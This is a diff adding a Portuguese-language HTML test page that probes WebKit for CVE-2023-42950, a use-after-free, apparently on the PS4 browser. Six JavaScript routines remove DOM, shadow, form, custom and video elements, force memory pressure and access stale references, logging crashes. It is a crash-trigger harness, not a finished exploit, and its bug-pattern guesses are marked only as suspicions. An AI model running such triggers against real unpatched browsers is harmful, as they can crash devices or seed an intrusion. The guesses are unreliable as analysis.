@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2023-42950 — Nan Wang UAF+ACE BZ#263682</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff4444;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#080010;border:2px solid #660000;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#cc6666;line-height:1.8}
+.src strong{color:#ff6666;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #1a0808;border-radius:5px;padding:10px;min-height:220px;white-space:pre;overflow-y:auto;max-height:450px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#88aaff}.sep{color:#333}
+.btn{display:inline-block;margin-top:8px;margin-right:5px;padding:7px 12px;background:#0d0004;border:1px solid #550000;border-radius:4px;color:#cc3333;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#ff4444;color:#ff6666}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🔴 CVE-2023-42950 — Nan Wang UAF + Arbitrary Code Exec (BZ#263682)</h1>
+<p class="meta">Nan Wang @eternalsakura13 · 360 Vulnerability Research · rushikesh nandedkar · WSA-2024-0002 (Mar/2024) · before WebKit 2.44.0</p>
+<div class="src">
+<strong>📋 ANÁLISE — Nan Wang BZ#263682</strong>
+CVE: CVE-2023-42950 · Impact: "Processing maliciously crafted web content may lead to arbitrary code execution"<br>
+Fix: "A use after free issue was addressed with improved memory management"<br>
+Afeta: WebKitGTK/WPE before 2.44.0 (fix entrou Mar 2024) · PS4 branch Set/2023 → <strong style="color:#ff4444">AFETADO</strong><br>
+<br>
+Nan Wang (@eternalsakura13) é pesquisador chefe da 360 Vulnerability Research.<br>
+Histórico: encontra UAFs em WebCore DOM lifecycle — callbacks durante destruição,<br>
+objetos liberados mas acessados via referências guardadas (style, computed, event).<br>
+Segundo pesquisador confirmado (rushikesh nandedkar) → bug severo o suficiente para<br>
+ser descoberto independentemente.<br>
+<br>
+PADRÃO SUSPEITO: HTMLElement sendo destruído enquanto event listener / MutationObserver<br>
+ainda têm referência ao RenderObject ou ao CSSStyleDeclaration interno.
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① HTMLElement + EventListener UAF</button>
+  <button class="btn" onclick="t2()">② Input Event + Destroy</button>
+  <button class="btn" onclick="t3()">③ Slot/Host Shadow UAF</button>
+  <button class="btn" onclick="t4()">④ FormData + Remove</button>
+  <button class="btn" onclick="t5()">⑤ CustomElement Lifecycle</button>
+  <button class="btn" onclick="t6()">⑥ HTMLVideoElement + Remove</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<15;i++)a.push(new ArrayBuffer(1024*1024*2));a=null}catch(e){}}
+
+function t1(){
+  sep('HTMLElement + EventListener UAF [CVE-2023-42950 suspect]');
+  l('Elemento removido enquanto event listener tem ref ao RenderObject...','w');
+  try {
+    var container = document.createElement('div');
+    document.body.appendChild(container);
+    var staleStyle = null, staleComputed = null;
+    for(var i = 0; i < 80; i++){
+      var el = document.createElement('div');
+      el.style.cssText = 'width:'+i+'px;height:'+i+'px;color:hsl('+i*4+',80%,50%)';
+      container.appendChild(el);
+      // Guarda ref INTERNA ao RenderObject via computedStyle antes de remover
+      staleComputed = window.getComputedStyle(el);
+      staleStyle = el.style;
+      el.addEventListener('click', function handler(e){
+        // Handler que tenta acessar propriedades do elemento já removido
+        var target = e.currentTarget;
+        if(target) { var s = target.style.color; }
+      });
+      container.removeChild(el); // remove — RenderObject destruído
+      gc();
+      // Acessa computed style do elemento destruído
+      try { var c = staleComputed.color; staleStyle.color = 'blue'; }
+      catch(e2){ l('UAF em stale ref iter='+i+': '+e2.name,'e'); }
+    }
+    document.body.removeChild(container);
+    l('HTMLElement+EventListener UAF: 80 iters sem crash fatal','ok');
+  } catch(e){ l('CRASH: '+e.name+' — '+e.message,'e'); }
+}
+
+function t2(){
+  sep('Input Event + Destroy (Nan Wang pattern)');
+  l('Input events em elementos removidos durante o handler...','w');
+  try {
+    var form = document.createElement('form');
+    document.body.appendChild(form);
+    var inputs = [];
+    for(var i = 0; i < 20; i++){
+      var inp = document.createElement('input');
+      inp.type = 'text'; inp.value = 'v'+i;
+      inp.setAttribute('data-idx', i);
+      inp.addEventListener('input', function(e){
+        var t = e.currentTarget;
+        // Remove o elemento DURANTE o evento input
+        if(t && t.parentNode) t.parentNode.removeChild(t);
+        gc();
+        // Tenta acessar o value depois de remover
+        try { var v = t.value; } catch(e2){}
+      });
+      form.appendChild(inp);
+      inputs.push(inp);
+    }
+    // Dispara input events
+    inputs.forEach(function(inp){
+      try {
+        inp.value = 'new_value';
+        inp.dispatchEvent(new Event('input', {bubbles:true}));
+      } catch(e2){}
+    });
+    if(form.parentNode) document.body.removeChild(form);
+    l('Input event + destroy: sem crash','ok');
+  } catch(e){ l('CRASH input: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('Slot + Shadow Host UAF');
+  l('Shadow DOM com slotted elements — host removido, slots orfãos...','w');
+  try {
+    var logs = [];
+    for(var i = 0; i < 30; i++){
+      var host = document.createElement('div');
+      var shadow = host.attachShadow({mode:'open'});
+      var slot = document.createElement('slot');
+      shadow.appendChild(slot);
+      for(var j = 0; j < 5; j++){
+        var slotted = document.createElement('span');
+        slotted.textContent = 'slotted-'+i+'-'+j;
+        slotted.addEventListener('slotchange', function(){});
+        host.appendChild(slotted);
+      }
+      document.body.appendChild(host);
+      // Força layout do shadow DOM
+      host.offsetHeight;
+      // Guarda ref ao slot
+      var slotRef = slot;
+      // Remove o host — shadow tree destruída mas slotRef pode sobreviver
+      document.body.removeChild(host);
+      gc();
+      // Acessa propriedades do slot após destruição do shadow
+      try {
+        var name = slotRef.name;
+        var assigned = slotRef.assignedNodes ? slotRef.assignedNodes() : null;
+        logs.push(name);
+      } catch(e2){ l('CRASH slot ref: '+e2.name,'e'); }
+    }
+    l('Shadow slot UAF: '+logs.length+'/30 sem crash','ok');
+  } catch(e){ l('CRASH shadow: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('FormData + Element Remove');
+  l('FormData com elementos removidos durante coleta...','w');
+  try {
+    var form = document.createElement('form');
+    form.id = 'uaf-form-'+Date.now();
+    document.body.appendChild(form);
+    // Adiciona muitos inputs
+    for(var i = 0; i < 30; i++){
+      var inp = document.createElement('input');
+      inp.name = 'field_'+i; inp.value = 'value_'+i;
+      form.appendChild(inp);
+    }
+    // Coleta FormData (força iteração pelos inputs)
+    var fd = new FormData(form);
+    // Remove alguns inputs APÓS criar FormData mas ainda iterando
+    var children = Array.from(form.elements);
+    children.forEach(function(c, idx){
+      if(idx % 2 === 0 && c.parentNode) form.removeChild(c);
+    });
+    gc();
+    // Cria novo FormData após remoções
+    var fd2 = new FormData(form);
+    var count = 0;
+    fd2.forEach(function(v, k){ count++; });
+    l('FormData entries: fd1=? fd2='+count,'ok');
+    document.body.removeChild(form);
+  } catch(e){ l('CRASH formdata: '+e.name,'e'); }
+}
+
+function t5(){
+  sep('CustomElement Lifecycle Callbacks UAF');
+  l('Custom elements com callbacks de lifecycle durante remoção...','w');
+  try {
+    if(!customElements.define) { l('CustomElements não disponível','w'); return; }
+    var name = 'uaf-test-'+Date.now();
+    var connected = 0, disconnected = 0, crashes = 0;
+    class UAFElement extends HTMLElement {
+      connectedCallback(){
+        connected++;
+        // Tenta acessar this.style durante connected — pode ser chamado com state inválido
+        try { var s = this.style.color; } catch(e2){ crashes++; }
+      }
+      disconnectedCallback(){
+        disconnected++;
+        // Remove filhos durante disconnected
+        while(this.firstChild) this.removeChild(this.firstChild);
+        gc();
+        // Ainda acessa this após potencial destruição
+        try { var h = this.offsetHeight; } catch(e2){ crashes++; }
+      }
+    }
+    customElements.define(name, UAFElement);
+    var host = document.createElement('div');
+    document.body.appendChild(host);
+    var elements = [];
+    for(var i = 0; i < 30; i++){
+      var el = document.createElement(name);
+      el.innerHTML = '<span>'+i+'</span><b>'+i+'</b>';
+      host.appendChild(el);
+      elements.push(el);
+    }
+    gc();
+    // Remove todos — disparando disconnectedCallback
+    elements.forEach(function(el){ if(el.parentNode) host.removeChild(el); });
+    gc();
+    document.body.removeChild(host);
+    l('CustomElement lifecycle: connected='+connected+' disconnected='+disconnected+' crashes='+crashes, crashes>0?'e':'ok');
+  } catch(e){ l('CRASH custom element: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('HTMLVideoElement + Remove Durante Load');
+  l('Video element removido durante fase de carregamento...','w');
+  try {
+    var videos = [];
+    var done = 0, total = 10;
+    function check(){ done++; if(done >= total) l('Video UAF: '+done+'/'+total+' sem crash fatal','ok'); }
+    for(var i = 0; i < total; i++){
+      (function(idx){
+        var v = document.createElement('video');
+        v.preload = 'auto';
+        v.addEventListener('loadstart', function(){
+          // Remove durante loadstart
+          if(v.parentNode) document.body.removeChild(v);
+          gc();
+          // Acessa propriedades após remoção
+          try { var dur = v.duration; var ready = v.readyState; } catch(e2){}
+          check();
+        });
+        v.addEventListener('error', function(){ check(); });
+        // src inválido mas que dispara loadstart
+        v.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAAC';
+        document.body.appendChild(v);
+        v.load();
+        videos.push(v);
+      })(i);
+    }
+    l('10 video elements com load iniciado...','i');
+  } catch(e){ l('CRASH video: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2023-42950 — Nan Wang UAF+ACE (BZ#263682) · WSA-2024-0002','w');
+  l('PS4 Set/2023 afetado — fix só em WebKit 2.44.0 (Mar 2024)','i');
+  t1();
+  setTimeout(t2,600); setTimeout(t3,1200); setTimeout(t4,1800);
+  setTimeout(t5,2400); setTimeout(t6,3000);
+}
+</script>
+</body>
+</html>
